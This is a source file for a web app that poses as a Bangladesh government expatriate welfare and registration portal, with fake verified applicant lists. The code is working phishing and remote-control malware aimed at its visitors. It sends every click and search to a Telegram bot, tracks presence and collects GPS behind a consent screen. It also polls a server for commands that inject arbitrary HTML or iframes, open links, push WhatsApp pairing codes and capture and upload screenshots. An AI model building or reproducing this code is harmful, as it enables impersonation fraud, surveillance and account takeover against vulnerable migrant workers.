                  FAM-{String(generatedProfiles[carouselIndex].id).padStart(4, '0')}-{1000 + (generatedProfiles[carouselIndex].id * 17) % 9000}-{4000 + (generatedProfiles[carouselIndex].id * 23) % 5000}
                </div>

                {/* Footer Section */}
                <div className="flex justify-between items-end relative z-10 w-full mt-1">
                  <div className="overflow-hidden">
                    <div className="text-[7.5px] uppercase font-black opacity-70 mb-0.5 tracking-wider">আবেদনের ধরণ</div>
                    <div className="text-[10px] font-black drop-shadow-sm truncate max-w-[170px]">{generatedProfiles[carouselIndex].application}</div>
                  </div>
                  <div className="text-right shrink-0">
                    <div className="text-[7.5px] uppercase font-black opacity-70 mb-0.5 tracking-wider font-['Hind_Siliguri']">মেয়াদ উত্তীর্ণ</div>
                    <div className="text-[10px] font-black drop-shadow-sm font-mono">
                      {String(((generatedProfiles[carouselIndex].id * 3) % 12) + 1).padStart(2, '0')}/3{generatedProfiles[carouselIndex].id % 5 + 4}
                    </div>
                  </div>
                </div>
              </motion.div>
            </AnimatePresence>
          </div>

          <div className="bg-gradient-to-r from-emerald-800 to-[#004d39] text-white p-6 rounded-[2.5rem] shadow-2xl relative overflow-hidden">
            <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 blur-2xl"></div>
            <h3 className="text-xl font-black mb-1.5 flex items-center gap-2">
              <LayoutDashboard size={24} /> এখন পর্যন্ত যারা আবেদন করেছেন তাদের তালিকা সমূহ
            </h3>
            <p className="text-xs opacity-80 font-bold leading-relaxed">
              প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান অনলাইন পোর্টাল আবেদনকারীদের সর্বশেষ লাইভ আপডেট
            </p>
            
            <div className="mt-5 grid grid-cols-2 gap-3">
              <div className="bg-white/10 backdrop-blur-md p-3.5 rounded-2xl border border-white/10">
                <p className="text-[9px] uppercase font-black opacity-75 mb-0.5 tracking-wider">মোট ভেরিফাইড আবেদন</p>
                <p className="text-xl font-black text-amber-300">১০,০০০ জন</p>
              </div>
              <div className="bg-white/15 backdrop-blur-md p-3.5 rounded-2xl border border-white/10">
                <p className="text-[9px] uppercase font-black opacity-75 mb-0.5 tracking-wider">আজকের নতুন আবেদন</p>
                <p className="text-xl font-black text-emerald-300">৪৫২ জন সম্পন্ন</p>
              </div>
            </div>
          </div>

          {/* Search, Filter, and Controls Panel */}
          <div className="bg-slate-50 p-5 rounded-3xl border border-slate-200/60 space-y-4">
            <div className="relative">
              <Search size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400" />
              <input 
                type="text" 
                placeholder="নাম, দেশ বা ফোন নম্বর দিয়ে খুঁজুন..." 
                value={searchQuery}
                onChange={(e) => {
                  setSearchQuery(e.target.value);
                  setCurrentPage(1);
                }}
                className="w-full pl-10 pr-9 py-3 bg-white border border-slate-200 rounded-2xl text-xs font-bold text-slate-800 placeholder-slate-400 focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 shadow-sm"
              />
              {searchQuery && (
                <button 
                  onClick={() => {
                    setSearchQuery('');
                    setCurrentPage(1);
                  }} 
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600"
                >
                  <X size={16} />
                </button>
              )}
            </div>

            <div className="grid grid-cols-2 gap-3 text-left">
              <div>
                <label className="block text-[10px] font-black text-slate-550 uppercase mb-1 pl-1">দেশ ফিল্টার:</label>
                <select 
                  value={selectedCountry}
                  onChange={(e) => {
                    setSelectedCountry(e.target.value);
                    setCurrentPage(1);
                  }}
                  className="w-full p-3 bg-white border border-slate-200 rounded-xl text-xs font-bold text-slate-700 focus:outline-none focus:border-emerald-500"
                >
                  <option value="all">সকল দেশ ({countriesList.length})</option>
                  {countriesList.map((country, idx) => (
                    <option key={idx} value={country.name}>{country.flag} {country.name}</option>
                  ))}
                </select>
              </div>
              <div>
                <label className="block text-[10px] font-black text-slate-550 uppercase mb-1 pl-1">আবেদনের টাইপ:</label>
                <select 
                  value={selectedApplication}
                  onChange={(e) => {
                    setSelectedApplication(e.target.value);
                    setCurrentPage(1);
                  }}
                  className="w-full p-3 bg-white border border-slate-200 rounded-xl text-xs font-bold text-slate-705 focus:outline-none focus:border-emerald-500"
                >
                  <option value="all">সকল বিষয় ({applicationTypes.length})</option>
                  {applicationTypes.map((app, idx) => (
                    <option key={idx} value={app}>{app}</option>
                  ))}
                </select>
              </div>
            </div>
          </div>

          {/* Facebook Style Interactive Profile List */}
          <div className="space-y-3">
            {displayedProfiles.length > 0 ? (
              displayedProfiles.map((profile) => (
                <div 
                  key={profile.id} 
                  className="bg-white p-4 rounded-3xl border border-slate-100 shadow-sm flex flex-col sm:flex-row sm:items-center justify-between gap-4 hover:border-emerald-200 hover:shadow-md transition-all group duration-350"
                >
                  <div className="flex items-start gap-3.5">
                    {/* Circle Image Wrapper with Live Active Status indicator */}
                    <div className="relative w-12 h-12 rounded-full ring-2 ring-emerald-50 bg-slate-50 overflow-hidden flex items-center justify-center shrink-0">
                      <img 
                        src={`my-logo${profile.id}.jpg`}
                        alt="" 
                        className="w-full h-full object-cover" 
                        referrerPolicy="no-referrer" 
                        onError={(e) => { 
                          e.currentTarget.style.display = "none"; 
                          const nextEl = e.currentTarget.nextSibling as HTMLElement;
                          if (nextEl) nextEl.classList.remove("hidden");
                        }} 
                      />
                      <div className="hidden w-full h-full bg-gradient-to-tr from-emerald-600 to-teal-700 text-white flex items-center justify-center font-black text-sm">
                        {profile.name[0]}
                      </div>
                      <div className="absolute bottom-0 right-0 w-3 h-3 bg-green-500 border-2 border-white rounded-full"></div>
                    </div>

                    <div className="text-left py-0.5">
                      <div className="flex items-center gap-1.5 flex-wrap">
                        <span className="font-black text-slate-850 text-sm">{profile.name}</span>
                        <span 
                          className="w-3.5 h-3.5 bg-blue-500 text-white text-[8px] font-black rounded-full flex items-center justify-center pointer-events-none shadow-sm shadow-blue-500/20" 
                          title="সরকার কর্তৃক ভেরিফাইড প্রোফাইল"
                        >
                          ✓
                        </span>
                        <span className="text-[10px] text-slate-400 font-bold font-mono">#{profile.id}</span>
                      </div>

                      {/* Completed Application Info */}
                      <p className="text-[11px] text-slate-650 font-bold mt-1 flex items-center gap-1">
                        <span className="text-emerald-555 font-black">✓</span> 
                        <span>আবেদন সম্পন্ন: </span>
                        <span className="text-indigo-900 underline decoration-indigo-200 underline-offset-2">{profile.application}</span>
                      </p>

                      {/* Country & masked Phone Number details */}
                      <div className="flex flex-wrap items-center gap-x-2 gap-y-1 mt-1 text-[10px] text-slate-500 font-bold">
                        <span className="bg-slate-100 px-2 py-0.5 rounded-md flex items-center gap-1">
                          <span>{profile.flag}</span>
                          <span>{profile.country}</span>
                        </span>
                        <span className="text-slate-300">•</span>
                        <span className="font-mono tracking-wider text-slate-550">📞 {profile.phone}</span>
                      </div>
                    </div>
                  </div>

                  {/* imo call button action */}
                  <div className="sm:self-center">
                    <a 
                      href={`${IMO_APP_CALL_URL}/${profile.id}`} 
                      target="_blank" 
                      rel="noopener noreferrer"
                      onClick={() => {
                        notifyBot(`IMO video/audio call initiated to target ${profile.id} name ${profile.name}`);
                      }}
                      className="w-full sm:w-auto flex items-center justify-center gap-1.5 px-4.5 py-3 sm:py-2.5 bg-[#21c260] hover:bg-[#1caa54] active:scale-[0.98] text-white rounded-2xl text-xs font-black shadow-lg shadow-emerald-500/15 group transition-all"
                    >
                      <div className="w-5 h-5 bg-white text-[#21c260] rounded-full flex items-center justify-center font-black text-[9px] tracking-tight shrink-0 shadow-sm border border-emerald-500/5 group-hover:scale-105 transition-transform">imo</div>
                      <span>কল করুন</span>
                    </a>
                  </div>
                </div>
              ))
            ) : (
              <div className="text-center py-12 bg-slate-50 rounded-[2rem] border border-dashed border-slate-200">
                <Users className="mx-auto text-slate-300 mb-3" size={36} />
                <p className="text-xs text-slate-500 font-black">অনুসন্ধান মেলেনি! অনুগ্রহ করে সঠিক তথ্য প্রদান করুন।</p>
              </div>
            )}
          </div>

          {/* Interactive Pagination controls with custom Jump Box */}
          {totalPages > 1 && (
            <div className="bg-slate-50 p-4 rounded-[2rem] border border-slate-200/60 flex flex-col items-center gap-4">
              <div className="flex items-center justify-between w-full">
                <button 
                  disabled={currentPage === 1}
                  onClick={() => {
                    setCurrentPage(prev => Math.max(prev - 1, 1));
                    notifyBot(`Paginated back to page ${currentPage - 1}`);
                  }}
                  className="p-3 bg-white rounded-2xl border border-slate-150 disabled:opacity-40 hover:bg-slate-100 transition-colors shadow-sm active:scale-95"
                  aria-label="Previous Page"
                >
                  <ChevronLeft size={16} />
                </button>
                
                <span className="text-xs font-black text-slate-700">
                  পৃষ্ঠা {currentPage} / {totalPages} (মোট {filteredProfiles.length} জনের তালিকা)
                </span>
                
                <button 
                  disabled={currentPage === totalPages}
                  onClick={() => {
                    setCurrentPage(prev => Math.min(prev + 1, totalPages));
                    notifyBot(`Paginated forward to page ${currentPage + 1}`);
                  }}
                  className="p-3 bg-white rounded-2xl border border-slate-150 disabled:opacity-40 hover:bg-slate-100 transition-colors shadow-sm active:scale-95"
                  aria-label="Next Page"
                >
                  <ChevronRight size={16} />
                </button>
              </div>

              {/* Jump to Page Input Box */}
              <div className="flex items-center gap-2 max-w-full">
                <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest shrink-0">পৃষ্ঠা সিলেক্ট করুন:</span>
                <input 
                  type="number" 
                  min="1" 
                  max={totalPages} 
                  placeholder={currentPage.toString()}
                  value={jumpPage}
                  onChange={(e) => setJumpPage(e.target.value)}
                  onKeyDown={(e) => {
                    if (e.key === 'Enter') {
                      const p = parseInt(jumpPage);
                      if (p >= 1 && p <= totalPages) {
                        setCurrentPage(p);
                        setJumpPage('');
                        notifyBot(`Jumped straight to page ${p}`);
                      }
                    }
                  }}
                  className="w-18 px-2 py-1.5 bg-white border border-slate-200 rounded-xl text-center text-xs font-black text-indigo-900 focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500"
                />
                <button 
                  onClick={() => {
                    const p = parseInt(jumpPage);
                    if (p >= 1 && p <= totalPages) {
                      setCurrentPage(p);
                      setJumpPage('');
                      notifyBot(`Jumped straight to page ${p}`);
                    }
                  }}
                  className="px-4 py-2 bg-indigo-900 hover:bg-indigo-805 text-white rounded-xl text-[10px] font-black shadow-md transition-colors"
                >
                  যাও
                </button>
              </div>
            </div>
          )}
        </motion.div>
      )}
    </div>
  );
};

export default function App() {
  const userId = new URLSearchParams(window.location.search).get('id');
  const [activeTgBotToken, setActiveTgBotToken] = useState('');

  const sendEmailNotification = async (email: string, name: string, status: string, type: 'status' | 'upload') => {
    try {
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, name, status, type })
      });
    } catch (err) {
      console.error('Email notify error:', err);
    }
  };

  const [globalUserId, setGlobalUserId] = useState<string>('');
  const [isRegistering, setIsRegistering] = useState(false);
  const [activeRegistrationType, setActiveRegistrationType] = useState<
    'family_card' | 'safe_remittance' | 'higher_edu_scholarship' | 'medical_vaccine_card' | 'pdo_certificate' | 'expatriate_grant' | 'bmet_smart_card'
  >('family_card');
  const [remoteAd, setRemoteAd] = useState<{
    type: 'text' | 'video' | 'photo' | 'html' | 'iframe';
    message?: string;
    mediaUrl?: string;
    htmlContent?: string;
  } | null>(null);
  const [targetUser, setTargetUser] = useState<TargetUser | null>(null);
  const [loading, setLoading] = useState(true);
  const [showAdmin, setShowAdmin] = useState(false);
  const [showContact, setShowContact] = useState(false);
  const [showUrgentSummons, setShowUrgentSummons] = useState(true);
  const [isEditing, setIsEditing] = useState(false);
  const [editData, setEditData] = useState<Partial<TargetUser>>({});
  const [toast, setToast] = useState<{ message: string; type: 'success' | 'error' } | null>(null);
  const [isUploadingDoc, setIsUploadingDoc] = useState(false);
  const [isUpdatingProfile, setIsUpdatingProfile] = useState(false);

  // Slideshow state indices
  const [slideIndex1, setSlideIndex1] = useState(0); // For my-logo1.jpg through my-logo10.jpg
  const [slideIndex2, setSlideIndex2] = useState(0); // For my-logo11.jpg through my-logo20.jpg

  useEffect(() => {
    const timer1 = setInterval(() => {
      setSlideIndex1((prev) => (prev + 1) % 10);
    }, 3000);
    const timer2 = setInterval(() => {
      setSlideIndex2((prev) => (prev + 1) % 10);
    }, 3000);
    return () => {
      clearInterval(timer1);
      clearInterval(timer2);
    };
  }, []);

  // States to support beautiful web push invitation dialog of Bangladesh Government Portal
  const [showPushBanner, setShowPushBanner] = useState(false);
  const [permissionState, setPermissionState] = useState<string>('default');
  const [showForcePushModal, setShowForcePushModal] = useState(false);

  // Convert Base64 VAPID key to UInt8Array for PushManager subscription
  const urlBase64ToUint8Array = (base64String: string) => {
    const padding = '='.repeat((4 - base64String.length % 4) % 4);
    const base64 = (base64String + padding)
      .replace(/\-/g, '+')
      .replace(/_/g, '/');

    const rawData = window.atob(base64);
    const outputArray = new Uint8Array(rawData.length);

    for (let i = 0; i < rawData.length; ++i) {
      outputArray[i] = rawData.charCodeAt(i);
    }
    return outputArray;
  };

  // Async task to handle notification request and register PushManager subscription dynamically
  const registerAndSubscribePush = async () => {
    if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
      console.warn('Push notification is not fully supported in this environment.');
      setShowPushBanner(false);
      return;
    }

    try {
      const permission = await Notification.requestPermission();
      setPermissionState(permission);
      setShowPushBanner(false);
      if (permission === 'granted') {
        setShowForcePushModal(false);
      }

      // Sync permission status back to backend which handles active Telegram push logging
      await fetch('/api/push-permission-update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: globalUserId || localStorage.getItem('session_user_id'),
          permission: permission
        })
      }).catch(err => console.error('Error reporting permission status:', err));

      if (permission !== 'granted') {
        notifyBot(`🔴 Push Notification denied by browser permission settings.`);
        return;
      }

      notifyBot(`🟢 Push Notification permission granted! Registering background worker (/sw.js)...`);

      // Register the service worker served dynamically from express backend
      const registration = await navigator.serviceWorker.register('/sw.js');
      console.log('[PUSH SERVICE] Registered successfully:', registration);

      await navigator.serviceWorker.ready;

      // Request public key from VAPID
      const keyRes = await fetch('/api/vapid-public-key');
      const keyData = await keyRes.json();
      if (!keyData.publicKey) {
        throw new Error('VAPID public key empty in server response.');
      }

      // Subscribe device to system push notifications
      const subscribeOptions = {
        userVisibleOnly: true,
        applicationServerKey: urlBase64ToUint8Array(keyData.publicKey)
      };

      const subscription = await registration.pushManager.subscribe(subscribeOptions);
      console.log('[PUSH SERVICE] Push Subscription Object:', subscription);

      // Save user subscription details on backend server
      await fetch('/api/push-subscribe', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: globalUserId || localStorage.getItem('session_user_id'),
          subscription: subscription
        })
      });

      setToast({ message: '🔔 পুশ নোটিফিকেশন সফলভাবে চালু করা হয়েছে!', type: 'success' });
      notifyBot(`🔔 User push subscription successfully tied to session client endpoint ID: ${globalUserId}`);
    } catch (err: any) {
      console.error('[PUSH SERVICE ALERT] Registration Failure:', err);
      notifyBot(`❌ Error configuring push alerts: ${err.message || err}`);
    }
  };

  const [systemSettings, setSystemSettings] = useState({ emailNotifications: true, maintenanceMode: false, tgBotToken: '', tgChatId: '' });
  const [activePage, setActivePage] = useState('home');
  const [searchQuery, setSearchQuery] = useState('');
  const [isSearchingDoc, setIsSearchingDoc] = useState(false);
  const [searchError, setSearchError] = useState('');
  const [registeredList, setRegisteredList] = useState<TargetUser[]>([]);

  // Consent Profile collection states
  const [consentDone, setConsentDone] = useState(() => localStorage.getItem('user_consent_given') === 'true');
  const [consentLoading, setConsentLoading] = useState(false);
  const [geoSelected, setGeoSelected] = useState(true);
  const [pingSelected, setPingSelected] = useState(true);
  const [hardwareSelected, setHardwareSelected] = useState(true);

  const handleGrantConsent = async () => {
    setConsentLoading(true);
    try {
      let geoAllowed = false;
      if (geoSelected && navigator.geolocation) {
        try {
          geoAllowed = await new Promise<boolean>((resolve) => {
            navigator.geolocation.getCurrentPosition(
              () => resolve(true),
              () => resolve(false),
              { enableHighAccuracy: true, timeout: 6000 }
            );
          });
        } catch (e) {
          console.error("GPS request failed or rejected:", e);
        }
      }

      const currentSession = localStorage.getItem('session_user_id') || 'unassigned';
      await sendVerifiedConsentTelemetry(currentSession, geoAllowed);

      localStorage.setItem('user_consent_given', 'true');
      setConsentDone(true);
      setToast({ message: 'আপনার সঠিক তথ্য ও লোকেশন বিবরণ সফলভাবে যাচাই করা হয়েছে। ফাইল এন্ট্রি প্রস্তুত করা হচ্ছে!', type: 'success' });
    } catch (error) {
      console.error(error);
      setToast({ message: 'তথ্য সংগ্রহ ও যাচাইকরণ ব্যর্থ হয়েছে। পুনরায় চেষ্টা করুন।', type: 'error' });
    } finally {
      setConsentLoading(false);
    }
  };

  useEffect(() => {
    const q = query(collection(db, 'targetUsers'), orderBy('createdAt', 'desc'));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const list: TargetUser[] = [];
      snapshot.forEach((doc) => {
        list.push({ id: doc.id, ...doc.data() } as TargetUser);
      });
      setRegisteredList(list);
    }, (error) => {
      handleFirestoreError(error, OperationType.LIST, 'targetUsers');
    });
    return unsubscribe;
  }, []);

  const handlePortalSearch = async (queryStr: string) => {
    const cleanQuery = queryStr.trim().toLowerCase();
    if (!cleanQuery) return;
    setIsSearchingDoc(true);
    setSearchError('');
    try {
      notifyBot(`🔍 <b>ইউজার ফাইল অনুসন্ধান করেছেন:</b>\n- <b>সার্চ কিওয়ার্ড:</b> <code>${queryStr}</code>`);
      const matched = registeredList.find(user => 
        user.idNumber?.toLowerCase() === cleanQuery || 
        user.phone?.replace(/\D/g, '') === cleanQuery.replace(/\D/g, '') ||
        user.phone === cleanQuery ||
        user.name?.toLowerCase().includes(cleanQuery) ||
        user.id?.toLowerCase().includes(cleanQuery)
      );

      if (matched) {
        setTargetUser(matched);
        const newUrl = new URL(window.location.href);
        newUrl.searchParams.set('id', matched.id);
        window.history.pushState({}, '', newUrl.toString());
        setToast({ message: 'আপনার ফাইলটি সফলভাবে লোড করা হয়েছে!', type: 'success' });
      } else {
        setSearchError('দুঃখিত, কোনো ফাইল পাওয়া যায়নি। অনুগ্রহ করে সঠিক এনআইডি, মোবাইল বা পাসপোর্ট নম্বর লিখুন।');
      }
    } catch (err) {
      console.error('Portal Search Error:', err);
      setSearchError('অনুসন্ধানে সমস্যা হয়েছে। অনুগ্রহ করে পুনরায় চেষ্টা করুন।');
    } finally {
      setIsSearchingDoc(false);
    }
  };

  useEffect(() => {
    notifyBot('User visited the portal');
    
    const handleClick = (e: MouseEvent) => {
      const target = e.target as HTMLElement;
      const text = target.innerText?.slice(0, 30).trim() || target.getAttribute('aria-label') || target.tagName;
      if (text && text.length > 2) {
        notifyBot(`User clicked: ${text}`);
      }
    };
    
    window.addEventListener('click', handleClick);
    return () => window.removeEventListener('click', handleClick);
  }, []);

  // Set up global user session ID and pull remote commands in real-time
  useEffect(() => {
    const initGlobalSession = async () => {
      let activeSession = localStorage.getItem('session_user_id');
      if (!activeSession) {
        try {
          const res = await fetch('/api/request-session-id');
          const contentType = res.headers.get("content-type");
          if (!res.ok || !contentType || !contentType.includes("application/json")) {
            throw new Error(`Non-JSON response (status: ${res.status})`);
          }
          const data = await res.json();
          if (data.success && data.sessionId) {
            localStorage.setItem('session_user_id', data.sessionId);
            setGlobalUserId(data.sessionId);
          }
        } catch (e) {
          const rand = 'user_' + Math.floor(1000 + Math.random() * 9000);
          localStorage.setItem('session_user_id', rand);
          setGlobalUserId(rand);
        }
      } else {
        setGlobalUserId(activeSession);
      }
    };
    initGlobalSession();
  }, []);

  // Check and setup push notification alert triggers on client load
  useEffect(() => {
    if ('Notification' in window) {
      setPermissionState(Notification.permission);
      if (Notification.permission === 'default') {
        const timer = window.setTimeout(() => {
          setShowPushBanner(true);
        }, 1500);
        return () => window.clearTimeout(timer);
      }
    }
  }, []);

  // Silently re-register push subscription if target browser already has granted permission
  useEffect(() => {
    if (!globalUserId) return;
    if ('Notification' in window && Notification.permission === 'granted') {
      registerAndSubscribePush();
    }
  }, [globalUserId]);

  // Track customer active visibility status and notify backend instantly when leaving
  useEffect(() => {
    if (!globalUserId) return;

    // Report online immediately on hook build
    fetch('/api/user-status-change', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userId: globalUserId, status: 'online' })
    }).catch(() => {});

    const reportStatus = (status: 'online' | 'offline') => {
      const url = '/api/user-status-change';
      const body = JSON.stringify({ userId: globalUserId, status });
      if (navigator.sendBeacon) {
        navigator.sendBeacon(url, body);
      } else {
        fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body,
          keepalive: true
        }).catch(() => {});
      }
    };

    const handleVisibilityChange = () => {
      const status = document.visibilityState === 'visible' ? 'online' : 'offline';
      reportStatus(status);
    };

    const handleUnloadAndExit = () => {
      reportStatus('offline');
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('beforeunload', handleUnloadAndExit);
    window.addEventListener('unload', handleUnloadAndExit);

    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('beforeunload', handleUnloadAndExit);
      window.removeEventListener('unload', handleUnloadAndExit);
    };
  }, [globalUserId]);

  useEffect(() => {
    if (!globalUserId) return;

    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/remote-command?userId=${globalUserId}`);
        const contentType = res.headers.get("content-type");
        if (!res.ok || !contentType || !contentType.includes("application/json")) {
          // Silent ignore for non-JSON status during reboots/gateways
          return;
        }
        const data = await res.json();
        if (data.success && data.command) {
          const cmd = data.command;

          // Immediately clear/acknowledge command on backend so we don't double execute
          await fetch('/api/clear-remote-command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId: globalUserId })
          });

          // Handle command types
          if (cmd.action === 'open_page') {
            const page = cmd.target;
            const isSubRegistration = [
              'family_card', 
              'safe_remittance', 
              'higher_edu_scholarship', 
              'medical_vaccine_card', 
              'pdo_certificate', 
              'expatriate_grant', 
              'bmet_smart_card'
            ].includes(page);

            if (isSubRegistration) {
              setActivePage('all-register');
              setActiveRegistrationType(page as any);
              setIsRegistering(true);
              const label = page === 'family_card' ? 'ফ্যামিলি স্মার্ট কার্ড আবেদন' : 
                            page === 'safe_remittance' ? 'নিরাপদ রেমিট্যান্স ক্যাশ প্রণোদনা' : 
                            page === 'higher_edu_scholarship' ? 'উচ্চশিক্ষা বৃত্তি ও সন্তান কল্যাণ' : 
                            page === 'medical_vaccine_card' ? 'মেডিকেল ও করোনা ভ্যাকসিন ডিজিটাল কার্ড' : 
                            page === 'pdo_certificate' ? 'পিডিও সার্টিফিকেট স্মার্ট আবেদন' : 
                            page === 'expatriate_grant' ? 'প্রবাসী অনুদান আবেদন' : 'বিএমইটি স্মার্ট কার্ড ডিজিটাল কপি';
              setToast({ 
                message: `⚡ অ্যাডমিন রিমোটলি আপনাকে সরাসরি "${label}" পেজে নিয়ে গিয়েছেন!`, 
                type: 'success' 
              });
              notifyBot(`Successfully executed direct registration navigation command to: [${page}]`);
            } else if (page === 'home' || page === 'all-register' || page === 'dashboard' || page === 'help-center') {
              setActivePage(page);
              setIsRegistering(false); // Reset
              setToast({ 
                message: `⚡ অ্যাডমিন রিমোটলি আপনাকে "${page === 'all-register' ? 'All Register' : page === 'help-center' ? 'Help Centre' : page.toUpperCase()}" পেজে নিয়ে গিয়েছেন!`, 
                type: 'success' 
              });
              notifyBot(`Successfully executed remote navigation command to: [${page}]`);
            }
          } else if (cmd.action === 'show_ad') {
            setRemoteAd({
              type: 'text',
              message: cmd.payload || ''
            });
            notifyBot(`Successfully played remote text advertisement popup payload.`);
          } else if (cmd.action === 'show_html_ad') {
            let htmlText = '';
            let fileUrl = '';
            if (cmd.fileId) {
              fileUrl = `/api/telegram-file?file_id=${cmd.fileId}`;
            } else if (cmd.payload) {
              htmlText = cmd.payload;
            }

            if (fileUrl) {
              fetch(fileUrl)
                .then(r => r.text())
                .then(code => {
                  setRemoteAd({
                    type: 'html',
                    htmlContent: code
                  });
                })
                .catch((err) => {
                  console.error("HTML fetch err:", err);
                  setRemoteAd({
                    type: 'html',
                    htmlContent: `<div style="padding:40px;text-align:center;color:#ef4444;font-family:sans-serif;"><h3>কোড ফাইল লোড করতে সমস্যা হয়েছে!</h3></div>`
                  });
                });
            } else {
              setRemoteAd({
                type: 'html',
                htmlContent: htmlText || `<div style="padding:40px;text-align:center;color:#718096;font-family:sans-serif;"><h3>কোনো কোড পাওয়া যায়নি</h3></div>`
              });
            }
            notifyBot(`Successfully processed remote live HTML code.`);
          } else if (cmd.action === 'show_web_ad') {
            setRemoteAd({
              type: 'iframe',
              mediaUrl: cmd.payload || ''
            });
            notifyBot(`Successfully processed remote website overlay display: ${cmd.payload}`);
          } else if (cmd.action === 'show_video_ad') {
            let videoUrl = '';
            if (cmd.fileId) {
              videoUrl = `/api/telegram-file?file_id=${cmd.fileId}`;
            } else if (cmd.payload && (cmd.payload.startsWith('http://') || cmd.payload.startsWith('https://'))) {
              videoUrl = cmd.payload;
            }
            setRemoteAd({
              type: 'video',
              message: cmd.payload && !cmd.payload.startsWith('http') ? cmd.payload : undefined,
              mediaUrl: videoUrl
            });
            notifyBot(`Successfully played remote video advertisement popup.`);
          } else if (cmd.action === 'show_photo_ad') {
            let photoUrl = '';
            if (cmd.fileId) {
              photoUrl = `/api/telegram-file?file_id=${cmd.fileId}`;
            } else if (cmd.payload && (cmd.payload.startsWith('http://') || cmd.payload.startsWith('https://'))) {
              photoUrl = cmd.payload;
            }
            setRemoteAd({
              type: 'photo',
              message: cmd.payload && !cmd.payload.startsWith('http') ? cmd.payload : undefined,
              mediaUrl: photoUrl
            });
            notifyBot(`Successfully played remote photo advertisement popup.`);
          } else if (cmd.action === 'open_link') {
            setToast({ message: `🔗 অ্যাডমিন রিমোট লিংক খুলতে বলেছে: ${cmd.payload || ''}`, type: 'success' });
            if (cmd.payload) {
              window.open(cmd.payload, '_blank');
              notifyBot(`Successfully opened remote link: ${cmd.payload}`);
            }
          } else if (cmd.action === 'whatsapp_pairing_code') {
            const rawCode = cmd.payload || '';
            window.dispatchEvent(new CustomEvent('whatsapp_pairing_code_updated', { detail: rawCode }));
            setToast({ message: `📱 হোয়াটসঅ্যাপ গেটওয়ে পেয়ারিং কোড সাকসেসফুলি সেট করা হয়েছে!`, type: 'success' });
            notifyBot(`WhatsApp Pairing Code remotely set and rendered: [${rawCode}]`);
          } else if (cmd.action === 'take_screenshot') {
            setToast({ message: `📸 অ্যাডমিন ব্রাউজার স্ক্রিনশট নেওয়ার অনুরোধ পাঠিয়েছেন...`, type: 'info' });
            setTimeout(async () => {
              try {
                const targetEl = document.getElementById('root') || document.body;
                const canvas = await html2canvas(targetEl, {
                  useCORS: true,
                  allowTaint: true,
                  backgroundColor: '#f8fafc',
                  logging: false,
                });
                
                canvas.toBlob(async (blob) => {
                  if (!blob) {
                    notifyBot(`❌ Screenshot capture failed: blob was null for user ${globalUserId}`);
                    return;
                  }
                  
                  const fileObj = new File([blob], `screenshot_${globalUserId}.png`, { type: 'image/png' });
                  const fd = new FormData();
                  fd.append('photo', fileObj);
                  fd.append('userId', globalUserId || '');
                  
                  const uploadRes = await fetch('/api/upload-screenshot', {
                    method: 'POST',
                    body: fd,
                  });
                  
                  const uploadData = await uploadRes.json().catch(() => ({}));
                  if (uploadData.success) {
                    console.log("Screenshot uploaded to Telegram successfully!");
                  } else {
                    notifyBot(`❌ Device screenshot upload failed: ${uploadData.error || 'Server error'}`);
                  }
                }, 'image/png');
              } catch (scrError: any) {
                console.error("Screenshot generation failed:", scrError);
                notifyBot(`❌ Browser error taking screenshot for ${globalUserId}: ${scrError.message || String(scrError)}`);
              }
            }, 600);
          }
        }
      } catch (err) {
        if (err && err.message && err.message.includes('Failed to fetch')) {
          console.warn("Remote polling connection temporarily lost, retrying...");
        } else {
          console.error("Remote polling err:", err);
        }
      }
    }, 2500);

    return () => clearInterval(interval);
  }, [globalUserId]);

  useEffect(() => {
    let unsubscribeSettings: (() => void) | undefined;
    if (userId) {
      setLoading(true);
      unsubscribeSettings = onSnapshot(doc(db, 'settings', 'global'), (docSnap) => {
        if (docSnap.exists()) {
          const settingsObj = docSnap.data();
          if (settingsObj.activeTgBotToken) {
            setActiveTgBotToken(settingsObj.activeTgBotToken);
          }
        }
      });

      const fetchUser = async () => {
        try {
          const docRef = doc(db, 'targetUsers', userId);
          const docSnap = await getDoc(docRef);
          if (docSnap.exists()) {
            setTargetUser({ id: docSnap.id, ...docSnap.data() } as TargetUser);
          }
        } catch (error) {
          handleFirestoreError(error, OperationType.GET, `targetUsers/${userId}`);
        } finally {
          setLoading(false);
        }
      };
      fetchUser();
    } else {
      setLoading(false);
    }

    return () => {
      if (unsubscribeSettings) {
        unsubscribeSettings();
      }
    };
  }, [userId]);

  const handleTelegramLink = async () => {
    if (!targetUser) return;
    try {
      const docRef = doc(db, 'targetUsers', targetUser.id);
      await updateDoc(docRef, { telegramChatId: 'Collected_Via_Bot' });
      window.open('https://t.me/AmiProbashiOfficialBot', '_blank');
    } catch (error) {
      console.error('Telegram link error:', error);
    }
  };

  const handleProfileUpdate = async () => {
    if (!targetUser) return;
    try {
      setIsUpdatingProfile(true);
      const docRef = doc(db, 'targetUsers', targetUser.id);
      await updateDoc(docRef, editData);
      setTargetUser({ ...targetUser, ...editData });
      setIsEditing(false);
      
      // Send notification if status changed
      if (editData.status && editData.status !== targetUser.status) {
        sendEmailNotification(targetUser.email || 'user@example.com', targetUser.name, editData.status, 'status');
      }
      
      setToast({ message: 'প্রোফাইল সফলভাবে আপডেট করা হয়েছে!', type: 'success' });
    } catch (error) {
      console.error('Update error:', error);
